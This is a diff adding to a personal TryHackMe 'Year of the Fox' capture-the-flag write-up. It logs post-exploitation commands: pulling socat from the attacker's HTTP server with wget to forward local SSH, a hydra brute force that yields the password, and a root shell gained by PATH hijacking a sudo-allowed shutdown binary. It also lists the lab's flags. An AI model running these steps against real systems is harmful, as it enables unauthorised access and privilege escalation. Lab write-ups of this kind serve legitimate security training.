@@ -636,3 +636,322 @@ ls
 css  fonts  images  js	php
 www-data@year-of-the-fox:/var/www/html/assets$ cd ..
 cd ..
+www-data@year-of-the-fox:/var/www/html$ ls
+ls
+assets	index.html
+www-data@year-of-the-fox:/var/www/html$ grep -Ri thm{
+grep -Ri thm{
+www-data@year-of-the-fox:/var/www/html$ cd ..
+cd ..
+www-data@year-of-the-fox:/var/www$ grep -Ri thm{
+grep -Ri thm{
+web-flag.txt:THM{Nzg2ZWQwYWUwN2UwOTU3NDY5ZjVmYTYw}
+
+www-data@year-of-the-fox:/var/www$ netstat -tulpn
+netstat -tulpn
+(Not all processes could be identified, non-owned process info
+ will not be shown, you would have to be root to see it all.)
+Active Internet connections (only servers)
+Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
+tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
+tcp        0      0 127.0.0.1:22            0.0.0.0:*               LISTEN      -                   
+tcp        0      0 0.0.0.0:445             0.0.0.0:*               LISTEN      -                   
+tcp        0      0 0.0.0.0:139             0.0.0.0:*               LISTEN      -                   
+tcp6       0      0 :::445                  :::*                    LISTEN      -                   
+tcp6       0      0 :::139                  :::*                    LISTEN      -                   
+tcp6       0      0 :::80                   :::*                    LISTEN      -                   
+udp        0      0 127.0.0.53:53           0.0.0.0:*                           -                   
+udp        0      0 10.10.249.21:68         0.0.0.0:*                           -                   
+udp        0      0 10.10.255.255:137       0.0.0.0:*                           -                   
+udp        0      0 10.10.249.21:137        0.0.0.0:*                           -                   
+udp        0      0 0.0.0.0:137             0.0.0.0:*                           -                   
+udp        0      0 10.10.255.255:138       0.0.0.0:*                           -                   
+udp        0      0 10.10.249.21:138        0.0.0.0:*                           -                   
+udp        0      0 0.0.0.0:138             0.0.0.0:*                           -     
+
+www-data@year-of-the-fox:/var/www$ netstat -tulw | grep ssh
+netstat -tulw | grep ssh
+tcp        0      0 localhost:ssh           0.0.0.0:*               LISTEN  
+
+port forwarding
+
+┌──(witty㉿kali)-[~/Downloads]
+└─$ cp /usr/bin/chisel chisel
+                                               
+┌──(witty㉿kali)-[~/Downloads]
+└─$ python3 -m http.server 1234
+Serving HTTP on 0.0.0.0 port 1234 (http://0.0.0.0:1234/) ...
+10.10.249.21 - - [25/Mar/2023 19:47:49] "GET /chisel HTTP/1.1" 200 -
+
+www-data@year-of-the-fox:/var/www$ cd /tmp
+cd /tmp
+www-data@year-of-the-fox:/tmp$ ls
+ls
+
+┌──(witty㉿kali)-[~/Downloads]
+└─$ locate socat                
+/usr/bin/socat
+
+┌──(witty㉿kali)-[~/Downloads]
+└─$ python3 -m http.server 1234
+Serving HTTP on 0.0.0.0 port 1234 (http://0.0.0.0:1234/) ...
+10.10.249.21 - - [25/Mar/2023 20:32:39] "GET /socat HTTP/1.1" 200 -
+
+www-data@year-of-the-fox:/tmp$ wget http://10.8.19.103:1234/socat
+wget http://10.8.19.103:1234/socat
+--  http://10.8.19.103:1234/socat
+Connecting to 10.8.19.103:1234... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 411624 (402K) [application/octet-stream]
+Saving to: 'socat'
+www-data@year-of-the-fox:/tmp$ chmod +x socat
+chmod +x socat
+www-data@year-of-the-fox:/tmp$ ./socat tcp-listen:8888,reuseaddr,fork tcp:localhost:22
+<cat tcp-listen:8888,reuseaddr,fork tcp:localhost:22
+./socat: error while loading shared libraries: libssl.so.3: cannot open shared object file: No such file or directory
+
+https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/socat
+
+download it , I was trying with chisel and shuttle but couldn't do it
+
+www-data@year-of-the-fox:/tmp$ rm socat
+rm socat
+www-data@year-of-the-fox:/tmp$ wget http://10.8.19.103:1234/socat
+wget http://10.8.19.103:1234/socat
+--  http://10.8.19.103:1234/socat
+Connecting to 10.8.19.103:1234... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 375176 (366K) [application/octet-stream]
+Saving to: 'socat'
+
+www-data@year-of-the-fox:/tmp$ chmod +x socat
+chmod +x socat
+www-data@year-of-the-fox:/tmp$ ./socat tcp-listen:8888,reuseaddr,fork tcp:localhost:22
+<cat tcp-listen:8888,reuseaddr,fork tcp:localhost:22
+
+┌──(witty㉿kali)-[~/Downloads]
+└─$ rustscan -a 10.10.249.21 --ulimit 5500 -b 65535 -- -A -Pn
+.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
+| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
+| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
+`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
+The Modern Day Port Scanner.
+________________________________________
+: https://discord.gg/GFrQsGy           :
+: https://github.com/RustScan/RustScan :
+ --------------------------------------
+Real hackers hack time ⌛
+
+[~] The config file is expected to be at "/home/witty/.rustscan.toml"
+[~] Automatically increasing ulimit value to 5500.
+[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
+Open 10.10.249.21:80
+Open 10.10.249.21:139
+Open 10.10.249.21:445
+Open 10.10.249.21:8888
+
+now is open port 22
+
+┌──(witty㉿kali)-[~/Downloads]
+└─$ hydra -l fox -P /usr/share/wordlists/rockyou.txt ssh://10.10.249.21:8888 -t 64     
+Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting
+[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
+[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
+[DATA] max 64 tasks per 1 server, overall 64 tasks, 14344399 login tries (l:1/p:14344399), ~224132 tries per task
+[DATA] attacking ssh://10.10.249.21:8888/
+[8888][ssh] host: 10.10.249.21   login: fox   password: ricardo
+1 of 1 target successfully completed, 1 valid password found
+[WARNING] Writing restore file because 21 final worker threads did not complete until end.
+[ERROR] 21 targets did not resolve or could not be connected
+[ERROR] 0 target did not complete
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished
+
+┌──(witty㉿kali)-[~/Downloads]
+└─$ ssh -p 8888 fox@10.10.249.21                   
+The authenticity of host '[10.10.249.21]:8888 ([10.10.249.21]:8888)' can't be established.
+ED25519 key fingerprint is SHA256:ytuC6e5+2EWnZLeockeugHFQMCmIRWlKFJR/MF8JPJo.
+This key is not known by any other names.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '[10.10.249.21]:8888' (ED25519) to the list of known hosts.
+fox@10.10.249.21's password: 
+
+	__   __                       __   _   _            _____         
+	\ \ / /__  __ _ _ __    ___  / _| | |_| |__   ___  |  ___|____  __
+	 \ V / _ \/ _` | '__|  / _ \| |_  | __| '_ \ / _ \ | |_ / _ \ \/ /
+	  | |  __/ (_| | |    | (_) |  _| | |_| | | |  __/ |  _| (_) >  < 
+	  |_|\___|\__,_|_|     \___/|_|    \__|_| |_|\___| |_|  \___/_/\_\
+
+                                                                  
+fox@year-of-the-fox:~$ ls
+samba  user-flag.txt
+fox@year-of-the-fox:~$ cat user-flag.txt 
+THM{Njg3NWZhNDBjMmNlMzNkMGZmMDBhYjhk}
+fox@year-of-the-fox:~$ cd samba/
+fox@year-of-the-fox:~/samba$ ls
+cipher.txt  creds1.txt
+fox@year-of-the-fox:~/samba$ cat cipher.txt 
+JV5FKMSNPJGTITTKKF5E46SZGJGXUVJSJZKFS6CONJCXUTTKJV4U26SBPJHUITJUJV5EC6SNPJMX
+STL2MN5E6RCNGJGXUWJSJZCE2NKONJGTETLKLEZE26SBGIFE4VCZPBBWUTJUJZVEK6SNPJGXOTL2
+IV5E6VCNGRHGURL2JVVFSMSNPJTTETTKJUYE26SRPJGWUTJSJZVE2MSNNJMTCTL2KUZE2VCNGBGX
+USL2JZVE2M2ONJEXUCSNNJGTGTL2JEZE4ULPPJHVITLXJZVEK6SPIREXOTLKIF4VURCCNBBWOPJ5
+BI======
+fox@year-of-the-fox:~/samba$ cat creds1.txt 
+JV5GO6SNKRGTKTL2M4ZE2VCNPBGXUWL2JZKE26SNPJGXUT2UJV4E26SVPJGXUWJSJV5FC6SNPJMT
+ETL2LF5E42SZPJGXURJSJV5E2MCONJKXUTSEJU2U42SZGIFE26SZPBBWUTJSJV5E2MSNKRGXOTL2
+KUZE2VCZPJGXUQL2J5CE26KONJITETSELF5E42SRGJGWUTL2JV5FC6SNIRGXQTL2IF5E22SNO5GX
+UY32J5KE26KNPJRXUCSPKRMXQTTKKEZE2Z3PPJGUIWJSJV5FC6SNPJEXOTLKIF4VURCCNBBWOPJ5
+BI======
+
+fox@year-of-the-fox:~/samba$ sudo -l
+Matching Defaults entries for fox on year-of-the-fox:
+    env_reset, mail_badpass
+
+User fox may run the following commands on year-of-the-fox:
+    (root) NOPASSWD: /usr/sbin/shutdown
+
+fox@year-of-the-fox:/usr/bin$ cd /usr/sbin
+
+fox@year-of-the-fox:/usr/sbin$ python3 -m http.server 
+Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
+10.8.19.103 - - [26/Mar/2023 02:05:35] "GET /shutdown HTTP/1.1" 200 -
+
+┌──(witty㉿kali)-[~/Downloads]
+└─$ wget http://10.10.249.21:8000/shutdown
+--  http://10.10.249.21:8000/shutdown
+Connecting to 10.10.249.21:8000... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 8304 (8.1K) [application/octet-stream]
+Saving to: ‘shutdown’
+
+shutdown              100%[=========================>]   8.11K  --.-KB/s    in 0s      
+
+(115 MB/s) - ‘shutdown’ saved [8304/8304]
+
+┌──(witty㉿kali)-[~/Downloads]
+└─$ file shutdown 
+shutdown: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=c855d329bb81903275997549d0856f9fcb1d40fd, not stripped
+
+┌──(witty㉿kali)-[~/Downloads]
+└─$ strings shutdown      
+/lib64/ld-linux-x86-64.so.2
+libc.so.6
+system
+__cxa_finalize
+__libc_start_main
+GLIBC_2.2.5
+_ITM_deregisterTMCloneTable
+__gmon_start__
+_ITM_registerTMCloneTable
+AWAVI
+AUATL
+[]A\A]A^A_
+poweroff
+;*3$"
+GCC: (Ubuntu 7.5.0-3ubuntu1~18.04) 7.5.0
+crtstuff.c
+deregister_tm_clones
+__do_global_dtors_aux
+completed.7698
+__do_global_dtors_aux_fini_array_entry
+frame_dummy
+__frame_dummy_init_array_entry
+shutdown.c
+__FRAME_END__
+__init_array_end
+_DYNAMIC
+__init_array_start
+__GNU_EH_FRAME_HDR
+_GLOBAL_OFFSET_TABLE_
+__libc_csu_fini
+_ITM_deregisterTMCloneTable
+_edata
+system@@GLIBC_2.2.5
+__libc_start_main@@GLIBC_2.2.5
+__data_start
+__gmon_start__
+__dso_handle
+_IO_stdin_used
+__libc_csu_init
+__bss_start
+main
+__TMC_END__
+_ITM_registerTMCloneTable
+__cxa_finalize@@GLIBC_2.2.5
+.symtab
+.strtab
+.shstrtab
+.interp
+.note.ABI-tag
+.note.gnu.build-id
+.gnu.hash
+.dynsym
+.dynstr
+.gnu.version
+.gnu.version_r
+.rela.dyn
+.rela.plt
+.init
+.plt.got
+.text
+.fini
+.rodata
+.eh_frame_hdr
+.eh_frame
+.init_array
+.fini_array
+.dynamic
+.data
+.bss
+.comment
+
+the binary executes `poweroff` without an absolute path
+
+fox@year-of-the-fox:/usr/sbin$ cd /tmp
+fox@year-of-the-fox:/tmp$ cp /bin/bash /tmp/poweroff
+fox@year-of-the-fox:/tmp$ sudo "PATH=/tmp:$PATH" /usr/sbin/shutdown
+root@year-of-the-fox:/tmp# cd /root
+root@year-of-the-fox:/root# ls -lah
+total 36K
+drwx------  5 root root 4.0K Mar 25 22:17 .
+drwxr-xr-x 22 root root 4.0K May 29  2020 ..
+lrwxrwxrwx  1 root root    9 May 28  2020 .bash_history -> /dev/null
+-rw-r--r--  1 root root 3.1K Apr  9  2018 .bashrc
+drwx------  2 root root 4.0K May 30  2020 .cache
+drwx------  3 root root 4.0K May 30  2020 .gnupg
+drwxr-xr-x  3 root root 4.0K May 28  2020 .local
+-rw-r--r--  1 root root  148 Aug 17  2015 .profile
+-rw-r--r--  1 root root   21 May 31  2020 root.txt
+-rw-r--r--  1 root root   75 May 31  2020 .selected_editor
+root@year-of-the-fox:/root# cat root.txt 
+Not here -- go find!
+
+root@year-of-the-fox:/root# find /home -group root -type f
+/home/rascal/.did-you-think-I-was-useless.root
+/home/fox/user-flag.txt
+/home/fox/samba/cipher.txt
+root@year-of-the-fox:/root# cat /home/rascal/.did-you-think-I-was-useless.root
+THM{ODM3NTdkMDljYmM4ZjdhZWFhY2VjY2Fk}
+
+Here's the prize:
+
+YTAyNzQ3ODZlMmE2MjcwNzg2NjZkNjQ2Nzc5NzA0NjY2Njc2NjY4M2I2OTMyMzIzNTNhNjk2ODMwMwo= (from base64)
+
+Good luck!
+
+https://cyberchef.io/#recipe=Reverse('Character')From_Hex('Auto')ROT13(true,true,false,21)&input=YTAyNzQ3ODZlMmE2MjcwNzg2NjZkNjQ2Nzc5NzA0NjY2Njc2NjY4M2I2OTMyMzIzNTNhNjk2ODMwMw
+
+08de5229f8abaa@tryhackme.com
+```
+- ![[Pasted image 20230325181741.png]]
+- What is the **web** flag?
+- ***THM{Nzg2ZWQwYWUwN2UwOTU3NDY5ZjVmYTYw}***
+- What is the **user** flag?
+- ***THM{Njg3NWZhNDBjMmNlMzNkMGZmMDBhYjhk}***
+- What is the **root** flag?
+- ***THM{ODM3NTdkMDljYmM4ZjdhZWFhY2VjY2Fk}***
+
+## Notes / Lessons Learned
+[[PS Eclipse]]
+
